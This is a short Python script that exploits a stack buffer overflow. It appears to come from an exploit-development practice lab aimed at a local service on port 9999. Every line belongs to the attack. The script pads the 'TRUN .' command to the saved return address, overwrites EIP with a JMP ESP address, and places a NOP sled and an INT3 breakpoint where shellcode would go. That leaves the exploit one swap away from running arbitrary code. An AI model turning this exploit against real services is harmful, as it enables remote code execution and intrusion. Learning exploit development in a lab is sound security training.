# We point the eip to the address x62 50 11 AF which contains the instructions JMP ESP (FF E4)
# x90 and xCC are Intel x86 instruction. More info can be found https://x86.puri.sm/ looking at INT 3
# Padding should be 973 F's.

import socket

dest = '127.0.0.1'
dport = 9999
distance_to_eip = 'A' * 2006
eip_overwrite = '\xaf\x11\x50\x62'
nop_sled = '\x90' * 16
break_instruction = '\xcc'
padding = 'F' * (3000 - len(distance_to_eip) - len(eip_overwrite) - len(nop_sled) - len(break_instruction))
shellcode_placeholder = nop_sled + break_instruction + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((dest, dport))
s.recv(100)
s.send('TRUN .' + distance_to_eip + eip_overwrite + shellcode_placeholder)
print(s.recv(100))
s.close()
